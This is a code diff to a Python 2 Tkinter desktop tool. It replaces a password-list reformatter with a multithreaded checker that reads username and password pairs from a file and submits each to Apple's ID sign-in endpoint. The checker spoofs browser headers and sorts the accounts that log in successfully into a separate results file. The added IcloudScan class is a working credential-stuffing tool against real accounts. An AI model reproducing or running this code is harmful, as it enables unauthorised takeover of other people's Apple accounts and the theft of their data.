@@ -3,6 +3,10 @@ import Tkinter as tk
 import tkMessageBox
 import tkFont
 import re
+import requests
+import threading
+import Queue
+import json
 import time
 from tkFileDialog import askopenfile
 
@@ -73,7 +77,7 @@ class FileHandle:
         tk.Entry(new_frame3,  textvariable=self.threading_num, width=3).grid(row=2, column=4, sticky=tk.W)
         self.threading_num.set(5)
         tk.Label(new_frame3, text=u'  ').grid(row=2, column=5, sticky=tk.W)
-        tk.Button(new_frame3, text=u'执行', command=self.test, font=ft).grid(row=2, column=6, sticky=tk.E)
+        tk.Button(new_frame3, text=u'执行', command=self.run, font=ft).grid(row=2, column=6, sticky=tk.E)
 
         tk.Label(self.root, text='-' * 110).grid(row=10, sticky=tk.W)
         self.tb = tk.Text(self.root)
@@ -117,85 +121,166 @@ class FileHandle:
             self.file_chose['text'] = u'已选择文件: %s' % self.read_file.name
             return self.read_file.name
 
-    def test(self):
-        if self.form_check():
-            print self.username.get(), self.passwd.get(), self.read_file, self.delimiter.get()
-            for i in range(100):
-                self.write_num['text'] = u'已写入: %s    ' % i
-                self.tb.insert(tk.END, '- ' * 40 )
-                self.tb.insert(tk.END, '%s\n ' % i)
-                self.tb.update()
-                self.tb.see(tk.END)
-
     def run(self):
         rtc = self.form_check()
         if rtc:
             runtime = time.clock()
-            write_file_name = self.read_file.name + '_py_ok_.txt'
-            with open(write_file_name, 'w+') as f:
-                letter_list = re.compile(r'[^a-z]*?([a-z]).*')
-                first_letter = re.compile(r'[^a-z]*?([a-z]).*')
-                first_letter_replace = re.compile(r'([^a-z]*?)[a-z](.*)')
-                last_letter = re.compile(r'.*([a-z])')
-                last_letter_replace = re.compile(r'(.*)[a-z](.*)')
-                delimiter = re.compile(
-                    re.sub(r'\s', r'\\s', self.delimiter_dic.get('b_delimiter', ''))
-                   )
-                real_deal_num = 0
-                for num, line in enumerate(self.read_file, 1):
-                    line = line.strip()
-                    try:
-                        if self.check_exchange.get():
-                            line = re.sub(
-                                delimiter,
-                                self.delimiter_dic['a_delimiter'],
-                                line
-                            )
-                        result = line.split(
-                            self.delimiter_dic['delimiter']
-                            )
-                        if len(result) != 2 or not result[1]:
-                            continue
-                        else:
-                            username, passwd = result
-                            if self.email_suffix_check.get():
-                                username += self.email_suffix.get()
-
-                            if self.check_emil.get():
-                                if '@' not in username:
-                                    continue
-                            if self.check_pass_len.get():
-                                if len(passwd) < int(self.pass_len.get()):
-                                    continue
-
-                            if self.rad_var.get():
-                                # print self.rad_var.get()
-                                try:
-                                    if self.letter_pos == 0:
-                                        letter = re.findall(first_letter, passwd)[0]
-                                        passwd = first_letter_replace.sub('\\1' + letter.upper() + '\\2', passwd)
-                                    elif self.letter_pos == -1:
-                                        letter = re.findall(last_letter, passwd)[0]
-                                        passwd = last_letter_replace.sub('\\1' + letter.upper() + '\\2', passwd)
-                                    elif self.letter_pos == 2:
-                                        letter_list = re.findall(letter_list, passwd)
-                                except IndexError:
-                                    pass
-                            line = self.delimiter_dic['delimiter'].join((username, passwd))
-                            if line:
-                                real_deal_num += 1
-                            # print line
-                            f.write(line + '\n')
-                    except IndexError:
-                        pass
-
-            self.read_file.seek(0)
-            self.proses['text'] = u'共处理%s 条数据, %s 条数据有效' % (num, real_deal_num)
-            tkMessageBox.showinfo(message='处理完成, 耗时: %s' % (time.clock() - runtime) )
+            print 128, int(self.threading_num.get())
+            s = IcloudScan(self.read_file, thread_num=int(self.threading_num.get()))
+            result = [
+                self.tb, self.line_num, self.write_num,
+                self.right_file, self.wrong_file, self.delimiter
+                      ]
+            s.main(result)
+            tkMessageBox.showinfo(message=u'处理完成, 耗时: %s' % (time.clock() - runtime) )
         else:
             print 'cuo'
+
     def main(self):
         self.root.mainloop()
+
+
+class IcloudScan:
+    """
+    According the Txt to check avaliabled
+    """
+    def __init__(self, file_fd, thread_num=5):
+        self.url = 'https://idmsa.apple.com/appleauth/auth/signin'
+        self.file = file_fd
+        self.line_num = 0
+        self.right = open('%s result-right.txt' % self.file.name, 'w')
+        self.wrong = open('%s result-error.txt' % self.file.name, 'w')
+        self.thread_num = thread_num
+        self.read_queue = Queue.Queue()
+        self.write_queue = Queue.Queue()
+        self.html = requests.session()
+        self.html.headers.update({
+            'Host': 'idmsa.apple.com',
+            'Connection': 'keep-alive',
+            'Content-Length': '101',
+            'X-Apple-Widget-Key': '83545bf919730e51dbfba24e7e8a78d2',
+            'Origin': 'https://idmsa.apple.com',
+            'X-Apple-I-FD-Client-Info': '{"U":"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36","L":"zh-CN","Z":"GMT+08:00","V":"1.1","F":"N0a44j1e3NlY5BSo9z4ofjb75PaK4Vpjt.gEngMQEjZrVglE4Ww.GEFF0Yz3ccbbJYMLgiPFU77qZoOSix5ezdstlYysrhsui65AQnKA15nW0vLG9mhORoVidPZW2AUMnGWVQdgMVQdg1kzoMpwoNJ9z4oYYLzZ1kzDlSgyyIT1n3wL6k03x0.5EwHXXTSHCSPmtd0wVYPIG_qvoPfybYb5EvYTrYesRNhjCJg7QD36hO3f9p_nH1uzjkD6myjaY2hDpBtOtJJIqSI6KUMnGWpwoNSUC56MnGW87gq1HACVcOJVB38cTjQhUfSHolk2dUf.j7J1gBZEMgzH_y3Cmx_B4WugMJeqDxp.jV2pNk0ug97.Dv64KxN4t1VKWZWu_JzK9zHkcCmx_B4W1kl1BQLz4mvmfTT9oaSumKkpjlRiwerbXh8bUu_LzQW5BNv_BBNlYCa1nkBMfs.9g."}',
+            'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36',
+            'Content-Type': 'application/json',
+            'Accept': 'application/json, text/javascript, */*; q=0.01',
+            'X-Requested-With': 'XMLHttpRequest',
+            'Referer': 'https://idmsa.apple.com/appleauth/auth/signin?widgetKey=83545bf919730e51dbfba24e7e8a78d2&locale=zh_CN&font=sf',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Accept-Language': 'zh-CN,zh;q=0.8',
+        })
+
+    def read_file(self, tk_line_total):
+        for line in self.file:
+            self.line_num += 1
+            self.read_queue.put(line)
+
+        tk_line_total['text'] = u'文件总数: %s  ' % self.line_num
+        # print 'Read file completed'
+        # print 'Totol line num is : %s' % self.line_num
+
+    def run(self, delimiter):
+        num = 0
+        flag = 1
+        while 1:
+            if not self.read_queue.empty():
+                line = self.read_queue.get(timeout=60)
+                if line:
+                    line = line.strip()
+                    if delimiter in line:
+                        username, passwd = line.split(delimiter)
+                    else:
+                        username, passwd = line.split()[:2]
+                num += 1
+                # print "%s handle the %s record" % (thread_name, num)
+                requests_data = json.dumps({
+                    'accountName': username,
+                    'password': passwd,
+                    'rememberMe': 'false',
+                    'trustTokens': []
+                })
+                while flag < 4:
+                    try:
+                        result = json.loads(
+                            self.html.post(
+                                self.url,
+                                data=requests_data,
+                                verify=True
+                            ).text
+                        )
+                        flag = 4
+                    except requests.exceptions.ConnectionError:
+                        print '[Error]: The %s time to try again!' % flag
+
+                    message = u'账号: %-25s 密码: %-15s ' % (username, passwd)
+                    if 'serviceErrors' in result:
+                        tmp_result = result['serviceErrors'][0]
+                        self.write_queue.put((
+                            self.wrong,
+                            message + u'不正确 错误代码: %s 错误信息: %s \n' % (
+                                tmp_result['code'],
+                                tmp_result['message']
+                            )))
+                    elif not result:
+                        self.write_queue.put((
+                            self.right,
+                            message + u'正确\n'
+                        ))
+
+                flag = 1
+            else:
+                # print "Record MQ is empty! threading: %s exit" % thread_name
+                break
+
+    def write_log(self, tb, write_num, right_num, wrong_num):
+        line = 0
+        r_n = w_n = 0
+        while 1:
+            try:
+                fd, message = self.write_queue.get(timeout=60)
+                if fd is self.wrong:
+                    w_n += 1
+                elif fd is self.right:
+                    r_n += 1
+
+                line += 1
+                print message
+                tb.insert(tk.END, message)
+                time.sleep(0.1)
+                tb.update()
+                tb.see(tk.END)
+                # write_num['text'] = u'已写入: %s    ' % line
+                # right_num['text'] = u'已写入: %s    ' % r_n
+                # wrong_num['text'] = u'已写入: %s    ' % w_n
+                fd.write(message.encode('utf8'))
+
+            except Queue.Empty:
+                # print "Writing MQ is empty!, threading exit"
+                break
+        # print "Totle of record writed is %s !" % line
+
+    def main(self, para_set):
+        tb, total_line, write_num, right_num, wroong_num, delimiter = para_set
+
+        thread_list = []
+        thread_list.append(
+            threading.Thread(target=self.read_file, args=(total_line,))
+        )
+        thread_list.append(
+            threading.Thread(target=self.write_log, args=(tb, write_num, right_num, wroong_num))
+        )
+        for tn in range(self.thread_num):
+            thread_list.append(
+                threading.Thread(target=self.run, args=(delimiter.get(),))
+            )
+
+        # run all
+        for mission in thread_list:
+            mission.start()
+        # recycle all
+        for mission in thread_list:
+            mission.join()
+
 if __name__ == '__main__':
     f = FileHandle()
     f.main()
